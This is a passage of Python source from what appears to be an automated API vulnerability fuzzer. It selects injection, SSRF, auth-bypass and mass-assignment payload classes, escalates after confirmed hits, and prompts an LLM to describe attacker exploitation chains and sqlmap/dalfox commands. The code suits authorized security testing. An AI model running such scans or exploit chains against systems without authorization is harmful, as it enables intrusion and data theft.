                req.anomaly_verdict  = verdict
                req.anomaly_signals  = signals
                result.requests.append(req)
                result.total_requests += 1
                budget_remaining -= 1

                # ── Step 5: DETECT + escalate ─────────────────────────
                if verdict in (VERDICT_CONFIRMED, VERDICT_LIKELY):
                    finding = self._make_finding(req, url, pcls, ptype, signals)
                    result.findings.append(finding)

                    # ── Step 6: ESCALATE — deeper set on first confirm ─
                    if verdict == VERDICT_CONFIRMED and budget_remaining > 5:
                        self.logger.info(
                            f"  CONFIRMED {pcls} — escalating with deeper set"
                        )
                        escalation_reqs = self._escalation_set(
                            endpoint, pcls, base_body, result.params_found
                        )
                        for ereq in escalation_reqs[:min(len(escalation_reqs), budget_remaining)]:
                            engine.send(ereq)
                            ev, es = self.detector.analyse(ereq, baseline)
                            ereq.anomaly_verdict = ev
                            ereq.anomaly_signals = es
                            result.requests.append(ereq)
                            result.total_requests += 1
                            budget_remaining -= 1
                            if ev == VERDICT_CONFIRMED:
                                result.findings.append(
                                    self._make_finding(ereq, url, pcls, "escalation", es)
                                )
                    break   # found something — move to next payload class

                if budget_remaining <= 0:
                    break

        # ── GraphQL special handling ──────────────────────────────────
        if result.api_type == "graphql" and budget_remaining > 0:
            self._fuzz_graphql(result, endpoint, engine, baseline, budget_remaining)

        # ── Auth bypass probes (always try regardless of class) ───────
        if budget_remaining > 0 and not result.auth_required:
            self._fuzz_auth_bypass(result, endpoint, engine, baseline)

        # ── Mass assignment probes (always for JSON endpoints) ────────
        if budget_remaining > 0 and param_type in ("json_body", "form_fields"):
            self._fuzz_mass_assignment(result, endpoint, engine, baseline)

        return result

    # ------------------------------------------------------------------
    # Payload class selection per endpoint context
    # ------------------------------------------------------------------

    def _select_payload_classes(
        self,
        api_type:   str,
        param_type: str,
        scan_results: Dict,
    ) -> List[Tuple[str, str, List]]:
        """
        Returns list of (payload_class, subtype, payload_list) tuples
        ordered by priority for this endpoint type.
        """
        pa          = scan_results.get("payload_analysis") or {}
        vuln_classes = pa.get("vuln_classes", [])
        tech         = (pa.get("tech_profile") or {})
        db_stack     = (tech.get("database") or "").lower()

        selected: List[Tuple[str, str, List]] = []

        # ── GraphQL — introspection first ────────────────────────────
        if api_type == "graphql":
            for subtype, payloads in FUZZ_PAYLOADS["graphql"].items():
                selected.append(("graphql", subtype, payloads))

        # ── SSTI — high yield, quick detection ───────────────────────
        if param_type in ("json_body", "url_param", "form_fields"):
            selected.append(("ssti", "detection", FUZZ_PAYLOADS["ssti"]["detection"]))

        # ── SQLi — target DB-specific set ────────────────────────────
        if "sqli" in vuln_classes or "sqli" in " ".join(vuln_classes):
            selected.append(("sqli", "quick_break",  FUZZ_PAYLOADS["sqli"]["quick_break"]))
            selected.append(("sqli", "time_based",   FUZZ_PAYLOADS["sqli"]["time_based"]))
            selected.append(("sqli", "error_trigger", FUZZ_PAYLOADS["sqli"]["error_trigger"]))

        # ── NoSQL — if stack suggests it ─────────────────────────────
        if "nosql" in vuln_classes or "mongo" in db_stack or "redis" in db_stack:
            selected.append(("nosql", "operator_injection", FUZZ_PAYLOADS["nosql"]["operator_injection"]))
            if param_type == "json_body":
                selected.append(("nosql", "js_injection", FUZZ_PAYLOADS["nosql"]["js_injection"]))

        # ── SSRF — JSON body params often pass URLs ───────────────────
        if "ssrf" in vuln_classes:
            selected.append(("ssrf", "internal", FUZZ_PAYLOADS["ssrf"]["internal"]))
            selected.append(("ssrf", "bypass",   FUZZ_PAYLOADS["ssrf"]["bypass"]))

        # ── CMDi ─────────────────────────────────────────────────────
        if "cmdi" in vuln_classes:
            selected.append(("cmdi", "unix",      FUZZ_PAYLOADS["cmdi"]["unix"]))
            selected.append(("cmdi", "blind_oob", FUZZ_PAYLOADS["cmdi"]["blind_oob"]))

        # ── Path traversal ────────────────────────────────────────────
        if "path_traversal" in vuln_classes or param_type == "path_param":
            selected.append(("path_traversal", "unix",    FUZZ_PAYLOADS["path_traversal"]["unix"]))
            selected.append(("path_traversal", "encoded", FUZZ_PAYLOADS["path_traversal"]["unix"]))

        # ── XSS — always worth trying for reflected APIs ──────────────
        if param_type in ("url_param", "form_fields"):
            selected.append(("xss", "basic", FUZZ_PAYLOADS["xss"]["basic"]))

        # ── IDOR — always try path params ────────────────────────────
        if param_type == "path_param":
            selected.append(("idor", "numeric", FUZZ_PAYLOADS["idor"]["numeric"]))

        # ── Type confusion — always run as a baseline canary ─────────
        selected.append(("type_confusion", "boundary", FUZZ_PAYLOADS["type_confusion"]["boundary"]))

        return selected

    # ------------------------------------------------------------------
    # GraphQL specific fuzzing
    # ------------------------------------------------------------------

    def _fuzz_graphql(
        self,
        result:   EndpointFuzzResult,
        endpoint: Dict,
        engine:   FuzzEngine,
        baseline: FuzzRequest,
        budget:   int,
    ) -> None:
        for subtype, payloads in FUZZ_PAYLOADS["graphql"].items():
            for pval in payloads[:budget]:
                req = FuzzRequest(
                    endpoint_id    = endpoint["_id"],
                    method         = "POST",
                    url            = endpoint["url"],
                    headers        = {"Content-Type": "application/json"},
                    params         = {},
                    body           = pval,
                    payload_class  = "graphql",
                    payload_subtype = subtype,
                    payload_value  = pval,
                )
                engine.send(req)
                verdict, signals = self.detector.analyse(req, baseline)
                req.anomaly_verdict = verdict
                req.anomaly_signals = signals
                result.requests.append(req)
                result.total_requests += 1

                if verdict in (VERDICT_CONFIRMED, VERDICT_LIKELY):
                    result.findings.append(
                        self._make_finding(req, endpoint["url"], "graphql", subtype, signals)
                    )

    # ------------------------------------------------------------------
    # Auth bypass probes
    # ------------------------------------------------------------------

    def _fuzz_auth_bypass(
        self,
        result:   EndpointFuzzResult,
        endpoint: Dict,
        engine:   FuzzEngine,
        baseline: FuzzRequest,
    ) -> None:
        for pval in FUZZ_PAYLOADS["auth_bypass"]["headers"]:
            req = FuzzRequest(
                endpoint_id    = endpoint["_id"],
                method         = endpoint.get("method", "GET").upper(),
                url            = endpoint["url"],
                headers        = pval,
                params         = {},
                body           = None,
                payload_class  = "auth_bypass",
                payload_subtype = "header_injection",
                payload_value  = pval,
            )
            engine.send(req)
            verdict, signals = self.detector.analyse(req, baseline)
            req.anomaly_verdict = verdict
            req.anomaly_signals = signals
            result.requests.append(req)
            result.total_requests += 1

            if verdict in (VERDICT_CONFIRMED, VERDICT_LIKELY):
                result.findings.append(
                    self._make_finding(req, endpoint["url"],
                                       "auth_bypass", "header_injection", signals)
                )

    # ------------------------------------------------------------------
    # Mass assignment probes
    # ------------------------------------------------------------------

    def _fuzz_mass_assignment(
        self,
        result:   EndpointFuzzResult,
        endpoint: Dict,
        engine:   FuzzEngine,
        baseline: FuzzRequest,
    ) -> None:
        for pval in FUZZ_PAYLOADS["mass_assignment"]["admin_fields"][:4]:
            req = FuzzRequest(
                endpoint_id    = endpoint["_id"],
                method         = endpoint.get("method", "POST").upper() if endpoint.get("method","GET") != "GET" else "POST",
                url            = endpoint["url"],
                headers        = {"Content-Type": "application/json"},
                params         = {},
                body           = pval,
                payload_class  = "mass_assignment",
                payload_subtype = "admin_fields",
                payload_value  = pval,
            )
            engine.send(req)
            verdict, signals = self.detector.analyse(req, baseline)
            req.anomaly_verdict = verdict
            req.anomaly_signals = signals
            result.requests.append(req)
            result.total_requests += 1

            if verdict in (VERDICT_CONFIRMED, VERDICT_LIKELY):
                result.findings.append(
                    self._make_finding(req, endpoint["url"],
                                       "mass_assignment", "admin_fields", signals)
                )

    # ------------------------------------------------------------------
    # Escalation set — deeper payloads after first confirmation
    # ------------------------------------------------------------------

    def _escalation_set(
        self,
        endpoint:    Dict,
        payload_class: str,
        base_body:   Dict,
        params_found: List[str],
    ) -> List[FuzzRequest]:
        reqs = []
        escalation_map = {
            "sqli":          ("union_probe",  FUZZ_PAYLOADS["sqli"]["union_probe"]),
            "ssti":          ("detection",    FUZZ_PAYLOADS["ssti"]["detection"]),
            "cmdi":          ("unix",         FUZZ_PAYLOADS["cmdi"]["unix"]),
            "ssrf":          ("cloud_imds",   FUZZ_PAYLOADS["ssrf"]["internal"][3:6]),
            "path_traversal": ("unix",        FUZZ_PAYLOADS["path_traversal"]["unix"][3:]),
            "nosql":         ("js_injection", FUZZ_PAYLOADS["nosql"]["js_injection"]),
        }
        if payload_class not in escalation_map:
            return reqs

        ptype, payloads = escalation_map[payload_class]
        reqs += self.builder.build_requests(
            endpoint       = endpoint,
            payload_class  = payload_class,
            payload_subtype = ptype + "_escalation",
            payload_values  = payloads,
            base_params    = {p: "test" for p in params_found[:3]},
            base_body      = base_body,
        )
        return reqs

    # ------------------------------------------------------------------
    # Baseline probe
    # ------------------------------------------------------------------

    @staticmethod
    def _probe_baseline(ep_id: str, url: str, method: str) -> FuzzRequest:
        return FuzzRequest(
            endpoint_id    = ep_id,
            method         = "GET",
            url            = url,
            headers        = {},
            params         = {},
            body           = None,
            payload_class  = "baseline",
            payload_subtype = "probe",
            payload_value  = None,
        )

    # ------------------------------------------------------------------
    # Finding builder
    # ------------------------------------------------------------------

    @staticmethod
    def _make_finding(
        req:     FuzzRequest,
        url:     str,
        pcls:    str,
        ptype:   str,
        signals: List[str],
    ) -> Dict:
        severity_map = {
            "sqli":           "critical",
            "ssti":           "critical",
            "cmdi":           "critical",
            "nosql":          "high",
            "ssrf":           "high",
            "path_traversal": "high",
            "auth_bypass":    "high",
            "xss":            "medium",
            "graphql":        "medium",
            "idor":           "medium",
            "mass_assignment": "high",
            "type_confusion": "low",
        }
        return {
            "finding_id":    req.req_id,
            "url":           url,
            "payload_class": pcls,
            "payload_subtype": ptype,
            "payload_value": str(req.payload_value)[:200],
            "verdict":       req.anomaly_verdict,
            "severity":      severity_map.get(pcls, "medium"),
            "signals":       signals,
            "error_sigs":    req.error_signatures_found[:5],
            "status_code":   req.response_status,
            "response_len":  req.response_length,
            "latency_s":     req.response_time_s,
            "timestamp":     req.timestamp,
            "sha256":        req.sha256,
            "evidence_snippet": req.response_body_snippet[:300],
        }

    # ------------------------------------------------------------------
    # Aggregation
    # ------------------------------------------------------------------

    @staticmethod
    def _aggregate_findings(ep_results: List[EndpointFuzzResult]) -> List[Dict]:
        seen:     Set[str] = set()
        findings: List[Dict] = []
        sev_order = ["critical","high","medium","low","info"]

        for ep in ep_results:
            for f in ep.findings:
                key = f"{f['url']}|{f['payload_class']}|{f['verdict']}"
                if key in seen:
                    continue
                seen.add(key)
                findings.append(f)

        findings.sort(key=lambda x: sev_order.index(x.get("severity","low"))
                      if x.get("severity","low") in sev_order else 99)
        return findings

    # ------------------------------------------------------------------
    # Pass 2 — Groq AI analysis
    # ------------------------------------------------------------------

    def _ai_analysis(
        self,
        domain:      str,
        ep_results:  List[EndpointFuzzResult],
        findings:    List[Dict],
    ) -> Optional[Dict]:
        try:
            prompt = self._build_prompt(domain, ep_results, findings)
            text   = self._call_groq(prompt)
            if not text:
                return None
            return self._parse_ai_response(text)
        except Exception as e:
            self.logger.error(f"AI analysis failed: {e}")
            return None

    def _build_prompt(
        self,
        domain:     str,
        ep_results: List[EndpointFuzzResult],
        findings:   List[Dict],
    ) -> str:
        condensed_eps = []
        for ep in ep_results[:10]:
            condensed_eps.append({
                "url":        ep.url,
                "api_type":   ep.api_type,
                "param_type": ep.param_type,
                "verdict":    ep.highest_verdict,
                "reqs":       ep.total_requests,
                "findings":   len(ep.findings),
                "params":     ep.params_found[:6],
            })

        condensed_findings = []
        for f in findings[:12]:
            condensed_findings.append({
                "url":           f["url"],
                "class":         f["payload_class"],
                "verdict":       f["verdict"],
                "severity":      f["severity"],
                "signals":       f["signals"][:4],
                "error_sigs":    f["error_sigs"][:3],
                "status_code":   f["status_code"],
                "latency_s":     f["latency_s"],
                "payload":       str(f["payload_value"])[:80],
            })

        return f"""You are a senior API security researcher reviewing autonomous fuzzing results for {domain}.
Analyze findings and return ONLY valid JSON.

Endpoints tested ({len(ep_results)} total):
{json.dumps(condensed_eps, indent=2)}

Anomaly findings ({len(findings)} total):
{json.dumps(condensed_findings, indent=2)}

Return a JSON object with EXACTLY these keys:
- "executive_summary": string — 3-4 sentences on the overall API security posture.
- "confirmed_vulnerabilities": array of objects, each with:
    "url" (string), "vulnerability_type" (string), "severity" (critical/high/medium/low),
    "proof" (string — what signal confirmed it), "exploitation_scenario" (string — 2 sentences),
    "recommended_fix" (string).
- "false_positive_assessment": array of strings — signals that likely need manual verification.
- "api_attack_surface_summary": object with:
    "total_endpoints" (int), "graphql_found" (bool), "auth_bypass_potential" (bool),
    "injection_classes_confirmed" (array of strings),
    "highest_risk_endpoint" (string — URL).
- "exploitation_sequence": array of strings — if multiple findings exist, describe how an
    attacker would chain them for maximum impact.
- "automation_commands": array of strings — specific tool commands (sqlmap, ghauri, dalfox,
    tplmap, graphql-cop) to validate top findings.

Return ONLY valid JSON. No markdown fences, no preamble."""

    def _call_groq(self, prompt: str) -> Optional[str]:
        headers = {
            "Authorization": f"Bearer {self.groq_api_key}",
            "Content-Type":  "application/json",
        }
        payload = {
            "model":       "llama3-70b-8192",
            "messages":    [{"role": "user", "content": prompt}],
            "temperature": 0.2,
            "max_tokens":  1800,
        }
        for attempt in range(3):
            try:
                self.logger.info(f"Groq API call attempt {attempt + 1}")
                resp = req_lib.post(
                    "https://api.groq.com/openai/v1/chat/completions",
                    headers = headers,
                    json    = payload,
                    timeout = 50,
                )
                if resp.status_code == 200:
                    return resp.json()["choices"][0]["message"]["content"]
                if resp.status_code == 429:
                    time.sleep(12 * (attempt + 1))
                    continue
                break
            except req_lib.exceptions.Timeout:
                if attempt < 2:
                    time.sleep(2 ** attempt)
            except Exception as e:
                self.logger.error(f"Groq error: {e}")
                break
        return None

    def _parse_ai_response(self, text: str) -> Optional[Dict]:
        cleaned = text.strip()
        if cleaned.startswith("```"):
            cleaned = cleaned.split("```")[1]
            if cleaned.startswith("json"):
                cleaned = cleaned[4:]
        cleaned = cleaned.strip()
        try:
            parsed = json.loads(cleaned)
            parsed["ai_model"]     = "Groq Llama3-70B"
            parsed["generated_at"] = datetime.now().isoformat()
            return parsed
        except json.JSONDecodeError:
            start = cleaned.find("{")
            end   = cleaned.rfind("}") + 1
            if start != -1 and end > start:
                try:
                    parsed = json.loads(cleaned[start:end])
                    parsed["ai_model"]     = "Groq Llama3-70B"
                    parsed["generated_at"] = datetime.now().isoformat()
                    return parsed
                except json.JSONDecodeError:
                    pass
        self.logger.error("Could not parse AI JSON response")
        return None

    # ------------------------------------------------------------------
    # Empty result helper
    # ------------------------------------------------------------------

    @staticmethod
    def _empty_result(domain: str, start: float) -> Dict:
        return {
            "endpoints_tested":          [],
            "findings":                   [],
            "total_requests":             0,
            "endpoints_with_findings":    0,
            "coverage_map":               {},
            "ai_analysis":                None,
            "scan_metadata": {
                "domain":                domain,
                "scan_duration_seconds": round(time.time() - start, 2),
                "timestamp":             datetime.now().isoformat(),
                "note":                  "No fuzzable endpoints found in payload_analysis",
            },
        }